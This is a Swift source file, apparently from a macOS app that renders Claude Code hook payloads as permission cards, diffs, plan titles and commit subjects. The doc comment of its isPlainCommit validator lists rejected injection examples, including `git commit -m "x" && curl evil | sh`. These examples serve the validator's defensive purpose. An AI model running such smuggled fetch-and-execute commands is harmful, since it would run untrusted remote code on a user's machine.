// HookText.swift
// Pure helpers that read hook payloads: permission titles and details, proposed
// changes, commit subjects, patch counts, tool verbs and session urgency.

import Foundation

enum HookText {

    static func urgency(_ state: SessionState) -> Int {
        switch state {
        case .needsYou: return 3
        case .working: return 2
        case .done: return 1
        case .idle: return 0
        }
    }

    static func verb(forTool tool: String) -> String {
        switch tool {
        case "Edit", "Write", "MultiEdit", "NotebookEdit": return "Editing"
        case "Bash": return "Running"
        case "Read", "Grep", "Glob": return "Reading"
        default: return "Thinking"
        }
    }

    static func permissionTitle(tool: String) -> String {
        switch tool {
        case "Bash": return "Run a command?"
        case "Edit", "MultiEdit", "NotebookEdit": return "Edit a file?"
        case "Write": return "Write a file?"
        case "Read": return "Read a file?"
        case "WebFetch": return "Fetch a page?"
        case "WebSearch": return "Search the web?"
        default: return "Use \(tool)?"
        }
    }

    static func permissionDetail(tool: String, input: JSONValue?) -> String {
        guard let input else { return tool }
        let keys = ["command", "file_path", "notebook_path", "url", "query", "pattern", "path"]
        for key in keys {
            if let value = input[key]?.stringValue, !value.isEmpty { return value }
        }
        return tool
    }

    /// Why the request is shown: the tool's own description, else the payload's message.
    /// What "Always" would remember is `alwaysRules`, shown on its own lines.
    static func permissionReason(payload: JSONValue) -> String? {
        if let text = payload["tool_input"]?["description"]?.stringValue, !text.isEmpty { return text }
        if let text = payload["message"]?.stringValue, !text.isEmpty { return text }
        return nil
    }

    /// What "Always" would remember, one line per `permission_suggestions` entry. The reply
    /// sends every entry back (SocketServer.replyLine), so the card must show every one.
    static func alwaysRules(payload: JSONValue) -> [String] {
        (payload["permission_suggestions"]?.arrayValue ?? []).map(suggestionText)
    }

    /// "Always allows Bash(npm test:*) for this session." An entry of a kind this app does
    /// not know still gets a line: it is sent back all the same.
    private static func suggestionText(_ suggestion: JSONValue) -> String {
        let destination: String? = {
            switch suggestion["destination"]?.stringValue {
            case "session": return "for this session"
            case "localSettings": return "in this project's local settings"
            case "projectSettings": return "in this project's settings"
            case "userSettings": return "in your user settings"
            default: return nil
            }
        }()
        var text: String?
        switch suggestion["type"]?.stringValue {
        case "setMode":
            let mode = suggestion["mode"]?.stringValue ?? ""
            text = mode == "acceptEdits" ? "Always accepts edits" : "Switches to \(mode) mode"
        case "addRules", "replaceRules":
            let rules = suggestion["rules"]?.arrayValue ?? []
            let names = rules.compactMap { rule -> String? in
                guard let tool = rule["toolName"]?.stringValue else { return nil }
                if let content = rule["ruleContent"]?.stringValue, !content.isEmpty { return "\(tool)(\(content))" }
                return tool
            }
            if !names.isEmpty {
                let verb = suggestion["behavior"]?.stringValue == "deny" ? "Always denies " : "Always allows "
                text = verb + names.joined(separator: ", ")
            }
        case "addDirectories":
            let dirs = (suggestion["directories"]?.arrayValue ?? []).compactMap { $0.stringValue }
            if !dirs.isEmpty { text = "Always adds " + dirs.joined(separator: ", ") }
        default:
            break
        }
        let line = text ?? "Applies " + (suggestion["type"]?.stringValue ?? "a permission update")
        return [line, destination].compactMap { $0 }.joined(separator: " ") + "."
    }

    /// The diff an Edit / Write / MultiEdit / NotebookEdit request would make, and the card title.
    static func proposedChange(tool: String, input: JSONValue?, cwd: String, readsDisk: Bool) -> (file: FileChange, title: String)? {
        guard let input else { return nil }
        switch tool {
        case "Edit":
            guard let path = input["file_path"]?.stringValue,
                  let old = input["old_string"]?.stringValue,
                  let new = input["new_string"]?.stringValue else { return nil }
            let file = DiffBuilder.forEdit(cwd: cwd, filePath: path, oldString: old, newString: new,
                                           replaceAll: input["replace_all"]?.boolValue ?? false, readsDisk: readsDisk)
            let title = file.kind == "new" ? "Write a new file?" : "Edit \(Format.fileName(file.path))?"
            return (file, title)
        case "Write":
            guard let path = input["file_path"]?.stringValue,
                  let content = input["content"]?.stringValue else { return nil }
            let file = DiffBuilder.forWrite(cwd: cwd, filePath: path, content: content, readsDisk: readsDisk)
            let title = file.kind == "new" ? "Write a new file?" : "Rewrite \(Format.fileName(file.path))?"
            return (file, title)
        case "MultiEdit":
            guard let path = input["file_path"]?.stringValue,
                  let list = input["edits"]?.arrayValue else { return nil }
            let edits = list.compactMap { edit -> (old: String, new: String, replaceAll: Bool)? in
                guard let old = edit["old_string"]?.stringValue, let new = edit["new_string"]?.stringValue else { return nil }
                return (old, new, edit["replace_all"]?.boolValue ?? false)
            }
            guard !edits.isEmpty else { return nil }
            let file = DiffBuilder.forMultiEdit(cwd: cwd, filePath: path, edits: edits, readsDisk: readsDisk)
            let name = Format.fileName(file.path)
            let title = file.kind == "new" ? "Write a new file?"
                : edits.count > 1 ? "Edit \(edits.count) places in \(name)?" : "Edit \(name)?"
            return (file, title)
        case "NotebookEdit":
            // The notebook on disk is JSON, not the cell: show the new cell source as added lines.
            guard let path = input["notebook_path"]?.stringValue ?? input["file_path"]?.stringValue,
                  let source = input["new_source"]?.stringValue else { return nil }
            var file = DiffBuilder.forWrite(cwd: cwd, filePath: path, content: source, readsDisk: false)
            file.kind = "edit"
            return (file, "Edit \(Format.fileName(file.path))?")
        default:
            return nil
        }
    }

    /// A plan's title: its first ATX heading (`#` to `######`) without the marks and a leading
    /// "Plan:" or "Plan –". Front matter and fenced code are skipped. With no heading, the
    /// first non-empty line; nil only for an empty plan.
    ///
    ///     "# Plan: Add the hook\n…"      "Add the hook"
    ///     "## Steps"                     "Steps"
    ///     "Rename the flag.\n…"          "Rename the flag."
    static func planTitle(_ markdown: String) -> String? {
        let lines = markdown.fileLines
        guard let index = planHeadingIndex(lines) else {
            return lines.lazy.map { $0.trimmingCharacters(in: .whitespaces) }.first { !$0.isEmpty }
        }
        var text = lines[index].trimmingCharacters(in: .whitespaces).drop(while: { $0 == "#" })
            .trimmingCharacters(in: .whitespaces)
        for prefix in ["plan:", "plan –", "plan —", "plan -"] where text.lowercased().hasPrefix(prefix) {
            text = text.dropFirst(prefix.count).trimmingCharacters(in: .whitespaces)
            break
        }
        return text.isEmpty ? nil : text
    }

    /// The plan's lines without the heading `planTitle` shows (and one blank line after it).
    /// Front matter stays; the Markdown renderer shows it as code.
    static func planBody(_ markdown: String) -> [String] {
        let source = markdown.fileLines
        var lines = source.map(String.init)
        guard let index = planHeadingIndex(source) else { return lines }
        lines.remove(at: index)
        if index < lines.count, lines[index].trimmingCharacters(in: .whitespaces).isEmpty {
            lines.remove(at: index)
        }
        return lines
    }

    /// The index of the first ATX heading outside front matter and fenced code.
    private static func planHeadingIndex(_ lines: [Substring]) -> Int? {
        var inFrontMatter = lines.first?.trimmingCharacters(in: .whitespaces) == "---"
        var fence: String? = nil
        for (i, raw) in lines.enumerated() {
            let line = raw.trimmingCharacters(in: .whitespaces)
            if inFrontMatter {
                if i > 0 && (line == "---" || line == "...") { inFrontMatter = false }
                continue
            }
            if let open = fence {
                if line.hasPrefix(open) { fence = nil }
                continue
            }
            if line.hasPrefix("```") || line.hasPrefix("~~~") { fence = String(line.prefix(3)); continue }
            let marks = line.prefix(while: { $0 == "#" }).count
            guard (1...6).contains(marks) else { continue }
            let rest = line.dropFirst(marks)
            if rest.isEmpty || rest.first == " " || rest.first == "\t" { return i }
        }
        return nil
    }

    /// Pulls the subject line out of `git commit -m "..."` or a heredoc message.
    static func commitSubject(from command: String) -> String? {
        let heredocMarkers = ["<<'EOF'", "<<\"EOF\"", "<<EOF", "<< 'EOF'", "<< EOF"]
        for marker in heredocMarkers {
            if let range = command.range(of: marker) {
                let rest = command[range.upperBound...]
                for line in rest.split(separator: "\n") {
                    let text = line.trimmingCharacters(in: .whitespaces)
                    if !text.isEmpty && text != "EOF" && !text.hasPrefix(")") { return text }
                }
            }
        }
        guard let flag = command.range(of: "-m ") else { return nil }
        var rest = command[flag.upperBound...].drop(while: { $0 == " " })
        guard let quote = rest.first, quote == "\"" || quote == "'" else { return nil }
        rest = rest.dropFirst()
        guard let end = rest.firstIndex(of: quote) else { return nil }
        let message = rest[..<end]
        guard let first = message.split(separator: "\n").first else { return nil }
        let subject = first.trimmingCharacters(in: .whitespaces)
        return subject.isEmpty ? nil : subject
    }

    /// True for a plain `git commit` and nothing more, so the commit card, whose Commit
    /// allows the whole command, can never approve a second command riding on it. The
    /// message arguments are set aside first (`-m "…"`, `-m '…'`, `--message=…`, `-am "…"`,
    /// and Claude Code's heredoc `-m "$(cat <<'EOF' … EOF\n)"`); a double-quoted message
    /// may not hold `$` or a backtick, an unquoted heredoc neither. What is left must be words
    /// of `[A-Za-z0-9_./=-]`: no `;`, `&&`, `||`, `|`, backtick, `$(`, `>`, `<` or newline.
    ///
    ///     git commit -m "Fix the peek"                           true
    ///     git commit -m "$(cat <<'EOF'\nFix\n\nBody\nEOF\n)"     true
    ///     git commit --amend --no-edit                           true
    ///     git commit -m "x" && curl evil | sh                    false
    ///     git commit -m "$(curl evil)"                           false
    ///     git commit -m x > /tmp/log                             false
    static func isPlainCommit(_ command: String) -> Bool {
        let s = Array(command.trimmingCharacters(in: .whitespacesAndNewlines))
        var i = 0
        func blank(_ c: Character) -> Bool { c == " " || c == "\t" }
        func skipBlanks() { while i < s.count, blank(s[i]) { i += 1 } }
        func boundary() -> Bool { i >= s.count || blank(s[i]) }
        func isWordChar(_ c: Character) -> Bool { c.isASCII && (c.isLetter || c.isNumber || "_./=-".contains(c)) }
        func take(_ text: String) -> Bool {
            let t = Array(text)
            guard i + t.count <= s.count, Array(s[i..<i + t.count]) == t else { return false }
            i += t.count
            return true
        }
        func word() -> String {
            let start = i
            while i < s.count, isWordChar(s[i]) { i += 1 }
            return String(s[start..<i])
        }
        // `"$(cat <<'EOF'` already taken: the body up to the marker line, then `)"`.
        func heredoc() -> Bool {
            let dash = take("-")
            skipBlanks()
            var quote: Character?
            if i < s.count, s[i] == "'" || s[i] == "\"" { quote = s[i]; i += 1 }
            let marker = word()
            guard !marker.isEmpty else { return false }
            if let quote { guard take(String(quote)) else { return false } }
            skipBlanks()
            guard take("\n") else { return false }
            while true {
                guard i < s.count else { return false }
                var end = i
                while end < s.count, s[end] != "\n" { end += 1 }
                let line = s[i..<end]
                i = min(end + 1, s.count)
                if String(line) == marker || (dash && String(line.drop(while: { $0 == "\t" })) == marker) { break }
                // An unquoted marker lets the shell expand the body.
                if quote == nil, line.contains(where: { "$`\\".contains($0) }) { return false }
            }
            while i < s.count, blank(s[i]) || s[i] == "\n" { i += 1 }
            return take(")\"")
        }
        // One message argument, taken only when the shell reads it as literal text.
        func message() -> Bool {
            guard i < s.count else { return false }
            if take("\"$(cat <<") { return heredoc() && boundary() }
            switch s[i] {
            case "'":
                i += 1
                while i < s.count, s[i] != "'" { i += 1 }
                guard take("'") else { return false }
            case "\"":
                i += 1
                while i < s.count, s[i] != "\"" {
                    if s[i] == "$" || s[i] == "`" { return false }
                    i += s[i] == "\\" ? 2 : 1
                }
                guard take("\"") else { return false }
            default:
                guard !word().isEmpty else { return false }
            }
            return boundary()
        }
        func takesMessage(_ w: String) -> Bool {
            if w == "-m" || w == "--message" || w == "--message=" { return true }
            // A short-option cluster ending in m: `-am`.
            return w.count > 2 && w.hasPrefix("-") && !w.hasPrefix("--") && w.hasSuffix("m")
                && w.dropFirst().allSatisfy { $0.isASCII && $0.isLetter }
        }

        guard word() == "git", i < s.count, blank(s[i]) else { return false }
        skipBlanks()
        guard word() == "commit", boundary() else { return false }
        while true {
            skipBlanks()
            if i >= s.count { return true }
            let w = word()
            if takesMessage(w) {
                skipBlanks()
                guard message() else { return false }
                continue
            }
            guard !w.isEmpty, boundary() else { return false }
        }
    }

    /// Counts added and removed lines in a Claude Code `structuredPatch`.
    static func patchCounts(_ patch: JSONValue?) -> (added: Int, removed: Int)? {
        guard let hunks = patch?.arrayValue else { return nil }
        var added = 0
        var removed = 0
        for hunk in hunks {
            for line in hunk["lines"]?.arrayValue ?? [] {
                guard let text = line.stringValue else { continue }
                if text.hasPrefix("+") { added += 1 } else if text.hasPrefix("-") { removed += 1 }
            }
        }
        return (added, removed)
    }
}
